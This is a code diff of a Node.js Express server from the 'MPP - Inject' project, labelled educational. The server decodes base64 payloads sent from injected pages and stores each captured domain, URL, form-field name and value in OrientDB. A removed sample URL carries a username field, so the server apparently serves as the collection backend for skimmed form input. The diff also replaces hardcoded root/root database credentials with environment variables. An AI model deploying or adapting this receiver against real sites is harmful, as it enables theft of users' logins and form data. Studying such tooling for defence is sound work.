@@ -1,22 +1,51 @@
-// http://0.0.0.0:8001/?domain=test.com&protocol=https&url=http://google.hr&path=past&name=username&value=test&type=text
+/*
+ * MPP - Inject
+ *
+ * Copyright (c) 2018, Ivan Sostarko (ivan.sostarko at hotmail.com)
+ *
+ * Github (https://github.com/IvanSostarko/mpp-inject)
+ *
+ * This program is created only for educational purposes.
+ *
+ * Licensed under the MIT License.
+ *
+ */
+
+
+// Include packages
 var app = require('express')();
 var bodyParser = require('body-parser');
 var Oriento = require('oriento');
 var cors = require('cors');
 var base64 = require('base-64');
+var dotenv = require('dotenv');
 
-var port = 3000;
+// Load ENV config
+dotenv.load();
 
+// Define Debug
+var debug_app = process.env.DEBUG;
 
+// Define App port
+var port = process.env.APP_PORT;
+
+// Define DB Server
 var server = Oriento({
-  host: '10.1.0.3',
-  port: 2424,
-  username: 'root',
-  password: 'root'
+  host: process.env.DB_HOST,
+  port: process.env.DB_PORT,
+  username: process.env.DB_USER,
+  password: process.env.DB_PASS
 });
 
 
-// parse application/json
+// Define Database
+var db = server.use({
+  name: process.env.DB_NAME,
+  username: process.env.DB_USER,
+  password: process.env.DB_PASS
+});
+
+
 app.use(bodyParser.json());
 app.use(cors());
 app.use(bodyParser.urlencoded({
@@ -24,28 +53,19 @@ app.use(bodyParser.urlencoded({
 }));
 
 
-var db = server.use({
-  name: 'mpp_inject',
-  username: 'root',
-  password: 'root'
-});
-console.log('Using database: ' + db.name);
-
-
+// Main API route
 app.get('/', function (req, res) {
 
-	// Decode
+	// Decode values
 	var req_payload = base64.decode(req.param('payload'));
 
-	//console.log(req_payload);
+	// Print Received Values
+	if(debug_app) {console.log("Received values: " + req_payload);}
 
+	// Encode
+    var objectValue = JSON.parse(req_payload);
 
-     var objectValue = JSON.parse(req_payload);
-       console.log(objectValue['prmrs_domain']);
-
-
-
-	// Get API Values and Decrypt IT
+	// Get API Values
 	var req_domain = objectValue['prmrs_domain'];
 	var req_protocol = objectValue['prmrs_protocol'];
 	var req_url = objectValue['prmrs_url'];
@@ -54,21 +74,27 @@ app.get('/', function (req, res) {
 	var req_value = objectValue['prmrs_value'];
 	var req_type = objectValue['prmrs_type'];
 
+	// Print parsed values
+	if(debug_app) {
+		console.log("New request from dummy page:)");
+		console.log("Domain: " + req_domain);
+		console.log("Protocol: " + req_protocol);
+		console.log("URL: " + req_url);
+		console.log("Path: " + req_path);
+		console.log("Name: " + req_name);
+		console.log("Value: " + req_value);
+		console.log("Type: " + req_type);
+	}
 
+	// Insert values in OrientDB
+	db.insert().into(process.env.DB_SHEMA).set({domain: req_domain, protocol: req_protocol, url: req_url, path: req_path, name: req_name, value: req_value, type: req_type}).one()
+	.then(function (mpp) {
 
-	console.log("New request");
-	console.log("Domain: " + req_domain);
-
-
-	db.insert().into('mpp_inject_shema').set({domain: req_domain, protocol: req_protocol, url: req_url, path: req_path, name: req_name, value: req_value, type: req_type}).one()
-	.then(function (user) {
-  	console.log('created', user);
+		if(debug_app) { console.log('New record inserted', mpp); }
 	});
-
 
 	// Always return status code 200
 	res.sendStatus(200);
-
 });
 
 app.listen(port, function() {
